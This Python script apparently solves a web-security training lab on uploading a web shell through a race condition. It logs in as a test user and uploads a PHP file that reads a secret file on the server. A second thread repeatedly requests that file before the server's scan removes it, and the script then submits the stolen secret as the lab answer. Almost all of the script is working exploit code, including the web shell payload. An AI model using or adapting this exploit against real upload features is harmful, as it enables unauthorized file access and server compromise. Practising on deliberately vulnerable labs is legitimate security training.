import requests
import sys
import urllib3
from colorama import init, Fore
from bs4 import BeautifulSoup
import random
import string
from requests_toolbelt.multipart.encoder import MultipartEncoder
from concurrent.futures import ThreadPoolExecutor
import threading

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

def csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {"name": "csrf"})['value']
    return csrf
    
def Web_shell_upload_via_race_condition(s, url, account_url):
    path = '/login'
    uri = url + path
    csrf = csrf_token(s, uri)
    r = s.post(uri, data={'csrf':csrf, 'username': 'wiener', 'password': 'peter'}, verify=False, proxies=proxies)
    if r.status_code == 200 and 'Log out' in r.text:
        print(Fore.GREEN + '[+] Successfully logged in to wiener account')
        print(Fore.YELLOW + '[+] Uploading web shell')
    upload_url = url + "/my-account/avatar"
    csrf = csrf_token(s, account_url)
    file = {"avatar": ('web-shell.php', "<?php echo file_get_contents('/home/carlos/secret'); ?>", 'application/x-php'), "user": "wiener", "csrf": csrf}   
    boundary = '------WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
    files = MultipartEncoder(fields=file, boundary=boundary)
    headers = {'Content-Type': files.content_type}
    s.post(upload_url, headers=headers, data=files, verify=False, proxies=proxies)

def request_avatar(url, s, proxies):
    while True:
        r = s.get(url + '/files/avatars/web-shell.php', verify=False, proxies=proxies)
        if r.status_code == 200:
            print(Fore.GREEN + f'[+] Answer is {r.text}')
            r = s.post(url + '/submitSolution', data={'answer':r.text}, verify=False, proxies=proxies)
            print(Fore.GREEN + '[+] Congratulations, you solved the lab!')
            return True
        elif r.status_code == 403:
            print(Fore.RED + '[-] Forbidden: Shell is still being scanned')
            return False

def main():
    try:
        if len(sys.argv) != 2:
            print(Fore.YELLOW + "[!] Usage: %s <url>" % sys.argv[0])
            return
    except IndexError as e:
        print(Fore.RED + f'[-] Error {e}')
        return
    
    s = requests.Session()
    url = sys.argv[1]
    account_url = url + "/my-account"
    
    upload_thread = threading.Thread(target=Web_shell_upload_via_race_condition, args=(s, url, account_url))
    request_thread = threading.Thread(target=request_avatar, args=(url, s, proxies))

    upload_thread.start()
    request_thread.start()

    upload_thread.join()
    request_thread.join()

if __name__ == "__main__":
    main()
